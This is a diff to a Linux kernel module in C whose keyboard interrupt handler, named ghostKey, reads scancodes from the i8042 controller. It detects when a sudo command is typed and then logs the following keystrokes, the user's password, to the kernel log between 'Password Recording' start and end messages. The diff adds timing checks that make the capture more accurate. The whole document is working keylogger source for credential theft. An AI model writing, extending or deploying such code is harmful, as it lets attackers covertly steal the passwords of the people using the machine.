@@ -38,31 +38,32 @@
 
 // Interrupt line of keyboard
 #define KEYBOARD_I8042 1
-
 // Register to access for data of key presses
 #define DATA_REGISTER 0x60
-
 // Numbers to use with terinary operations to achieve statuses/values of keys
 // Translates to: 0111 1111
 #define KEY_PRESS_MASK 0x7f
 // Translates to: 1000 0000
 #define KEY_STATUS_MASK 0x80
 
+// START : ALL CODE BELOW RELATED TO PASSWORD CHECKING AND VERIFICATION
+
 // Checks for sudo command input to keyboard
 bool check1 = false;
 bool check2 = false;
 bool check3 = false;
 bool check4 = false;
-
 // Needed for prints to print without messing up format
 bool printedM1 = false;
 bool printedM2 = true;
-
 // Needed for one print for iteration / adding extra security to the prints
 bool printedI = false;
-
 // Represents when password tracking begins
 bool record = false;
+
+// END : PASSWORD CHECKING AND VERIFICATION FINISHED
+
+// START : ALL CODE BELOW RELATED TO KEY PRESSES
 
 // Integer values for specific key presses
 int dataCodeValues[100];
@@ -73,16 +74,42 @@ char *uppercaseKeys[100][15];
 bool shiftPressed = false;
 bool capsLockOn = false;
 
+// END : CODE RELATED TO KEY PRESSES FINISHED
+
+// START : ALL CODE BELOW RELATED TO LOWER LEVEL KEY PRESS HANDLING TIMES
+
 // Time variables for inhumane key press bug
+// (Inhumane Key Press Issue)
 struct timespec64 time;
 long long int previousTime = 0;
 long long int currentTime = 0;
 long long int compareTime = 0;
 char previousKey;
 bool skip = false;
-// Nanoseconds
-int bottomThresh = 40000000;
 
+// Time variables for unrealisitc password time
+// (Time Skip Issue)
+long long int printOne = 0;
+long long int printTwo = 0;
+bool isPrintOne = true;
+long long int printDifference = 0;
+
+// Signal print once
+long long int previousSigPrint = 0;
+long long int currentSigPrint = 0;
+long long int differenceSigPrint = 0;
+
+// CHANGE : CHANGE BASED ON MACHINE
+// Relative inhumane speeds and signal issue times
+// Testing must be done to get these numbers exactly correct
+int bottomThresh = 40000000;
+int signalThreshLow = -700000000;
+int signalThreshHigh = 220000000;
+
+// To see if print signal errors
+bool active = false;
+
+// END : LOWER LEVEL KEY PRESS HANDLING TIMES FINISHED
 
 // Irqreturn_t is always the return type of an interrupt handler, which is what this
 // function actually is, this allows us to obtain key values
@@ -102,8 +129,6 @@ static irqreturn_t ghostKey(int interruptRequest, void *developerID) {
 	if ((dataCode == previousKey) && (compareTime < bottomThresh)) {
 		skip = true;
 	}
-	// Set for key compares
-	previousKey = dataCode;
 
 	// IF DELAY IS HUMANLY POSSIBLE
 	if (!skip) {
@@ -143,6 +168,16 @@ static irqreturn_t ghostKey(int interruptRequest, void *developerID) {
 							if (record && (*uppercaseKeys[i] != (char*)"enter") && (*uppercaseKeys[i] != (char*)"lshift")
 							&& (*uppercaseKeys[i] != (char*)"rshift") && (*uppercaseKeys[i] != (char*)"capson")
 							&& (*uppercaseKeys[i] != (char*)"capsoff")) {
+									// FIND TIME INBETWEEN LAST PRINT
+									ktime_get_real_ts64(&time);
+									if (isPrintOne) {
+										printOne = time.tv_nsec;
+										isPrintOne = false;
+									}
+									else {
+										printTwo = time.tv_nsec;
+										isPrintOne = true;
+									}
 									pr_info("%s\n", *uppercaseKeys[i]);
 							}
 						}
@@ -176,6 +211,16 @@ static irqreturn_t ghostKey(int interruptRequest, void *developerID) {
 							if (record && (*lowercaseKeys[i] != (char*)"enter") && (*uppercaseKeys[i] != (char*)"lshift")
 							&& (*uppercaseKeys[i] != (char*)"rshift") && (*uppercaseKeys[i] != (char*)"capson")
 							&& (*uppercaseKeys[i] != (char*)"capsoff")) {
+									// FIND TIME INBETWEEN LAST PRINT
+									ktime_get_real_ts64(&time);
+									if (isPrintOne) {
+										printOne = time.tv_nsec;
+										isPrintOne = false;
+									}
+									else {
+										printTwo = time.tv_nsec;
+										isPrintOne = true;
+									}
 									pr_info("%s\n", *lowercaseKeys[i]);
 							}
 						}
@@ -206,16 +251,42 @@ static irqreturn_t ghostKey(int interruptRequest, void *developerID) {
 		// PRINT START AND FINISH
 		if (record && !printedM1)
 		{
-			pr_info("Starting Password Recording : Ready\n");
+			pr_info("START: Starting Password Recording ; Ready\n");
 			printedM1 = true;
+			active = true;
 		}
 		if (!record && !printedM2)
 		{
-			pr_info("Ending Password Recording : Finished\n");
+			pr_info("END: Ending Password Recording ; Finished\n");
 			printedM2 = true;
+			active = false;
 		}
 	}
 
+	if (active) {
+		// Error check for unrelative lag time
+		if (printOne != 0 && printTwo != 0) {
+			// Calculate based on which one comes first
+			if (isPrintOne) {
+				printDifference = printTwo - printOne;
+			}
+			else {
+				printDifference = printOne - printTwo;
+			}
+			// If glitch possible based on same key issue
+			if ((dataCode == previousKey)) {
+				// If not a normal key press : could be imporved upon by tracing users normal press time
+				if (printDifference < signalThreshLow || printDifference > signalThreshHigh) {
+						// Prints as many times as the key attempted to print given holding time
+						pr_info("%s", "Signaling Error: Recent Key Malfunctioned.");
+				}
+			}
+		}
+	}
+	
+	// Set for key compares
+	previousKey = dataCode;
+	// Reset skip value
 	skip = false;
 
 	// Return signal that IRQ is handled
